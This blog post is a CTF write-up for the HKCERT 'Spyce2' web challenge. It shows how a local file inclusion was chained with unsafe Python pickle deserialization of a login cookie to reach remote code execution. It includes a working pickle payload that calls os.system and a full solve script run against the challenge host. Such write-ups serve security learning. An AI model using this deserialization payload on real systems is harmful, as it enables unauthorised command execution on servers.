---
title: "HKCERTCTF 2021 Writeup"
date: 2022-11-15T17:00:10+08:00
draft: false
categories:
 - ctf
tags:
 - ctf
 - writeup
 - web
summary: "Writeup for HKCERT CTF 2022"
---

# Background
11 Nov 2021, 18:00 HKT — 13 Nov 2021, 18:00 HKT  
Format: Jeopardy  
Official URL: https://ctf.hkcert.org/  
Organisers: HKCERT, Black Bauhinia 
CTFtime: https://ctftime.org/event/1722 

After one lazy year, this blog is updated again and it is the writeup for the HKCERT CTF 2022, which is also the 2nd year I participated and got the same result - the 5-th in the open category.
This time I prepared only 1 writeup (not because of lazy :P) which has only 1 solve (:D) and it is an unintened solution (The author's method is about injecting payload to the sqlite database then include it). This also show the value of white-box penetration testing: when provided the full source code of an framework, we can always find many different ways to exploit.
Btw I hope I could have more time to update the blog, as there are few awesome red teaming related research I would like to share...

# Challenge
## Spyce2 - Web (400 points)
### Challenge :
> Flag 2: Read /flag2-*


### Files : 
[spyce_222c677640e7721636b146c58425aee3.zip](/files/HKCERT/spyce_222c677640e7721636b146c58425aee3.zip)

### Solution : 
This is part 2 of the challenge "Spyce". From the provided `Dockerfile`, we know that the filename of flag2 was appended with 64 random alphanumeric characters :

`RUN mv /flag2 /flag2-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)`

Recall in part 1, we can perform LFI to get the flag1 but since we don't know the exact file name of flag2, we cannot simply redo with LFI, but maybe we can try to achieve RCE from LFI (which is also a very common attack path). 

When it comes to "RCE from LFI", usually we will look into the logs and sessions. While nothing was found when searching for the logs, a folder `spyce-2.1/www/login-tokens` was found and it looks interesting (and suspicious) to me.

Next I tried to search for the relevant code that will interact with this folder and I found the file `spyce-2.1/spyceconf.py` with the line of code

`login_storage = FileStorage(os.path.join(SPYCE_HOME, 'www', 'login-tokens'))`,

suggesting this folder is responsible for storing some login information, maybe the login sessions? Also in the file a few lines followed are describing the tags to render login form, so let's try some local testing.

I spinned up a docker container and accessed one of the examples `spyce-2.1/www/docs/examples/login-optional.spy`. We can see a new file `spytoken-2` was created after a success login with user id `2`, and there is a cookie `_spy_login` set with the value storing in this file.

![local test]()

Through the LFI, we are able to access and retrieve the value of the session, so let's see if we could inject malicious payload to the session and gain RCE.

![LFI]()

Next let's try to search for the relevant code handling the session with the keyword `spytoken` and from the file `spyce-2.1/tags/_coreutil.py` we could find the relevant logic. When reviewing the code of the function `login_from_cookie`, the line of code 

`uid, token = pickle.loads(cookie['_spy_login'])`

caught my attention: it may be possible to achieve RCE via the Python pickle deserialization.

A quick poc (in Python version 2.7) was developed and it worked successfully, by sending a request to the page `login-optional.spy` (`login-required.spy` would work as well) and the file containing the result of listing root directory was created.

![RCE]()

```
import pickle
import os
import urllib
class genpoc(object):
    def __reduce__(self):
        s = "ls / > /home/spwnce/www/login-tokens/ja5on_givemetheflag.txt"
        return os.system, (s,)

e = genpoc()
poc = pickle.dumps(e)
print(urllib.quote(poc))
```
With the full filename of flag2, we could then get the flag via LFI used in part 1!
A sample automated script was attached below.

**Solve:**
```
import pickle
import os
import urllib
import requests

class genpoc(object):
    def __reduce__(self):
        s = "ls / > /home/spwnce/www/login-tokens/ja5on_givemetheflag.txt"
        return os.system, (s,)

# Generate the Python pickle deserialization payload
e = genpoc()
payload = urllib.quote(pickle.dumps(e))

url = "http://chal-b.hkcert22.pwnable.hk:28039"
cookies = {'_spy_login': payload}

# Python pickle deserialization RCE
r = requests.get(url + "/docs/examples/login-optional.spy", cookies=cookies)

# Get the full file name of flag2
r = requests.get(url + "/login-tokens/ja5on_givemetheflag.txt")
pos = r.text.find('flag2')

# LFI to get flag2
r = requests.get(url + "/dump.spy?path=/" + r.text[pos:pos+70])

print("Flag: ")
print(r.text)
```

FLAG : **hkcert22{LFI2RCE_again....Maybe_PSP_is_w0r5e_tyan_PHP}**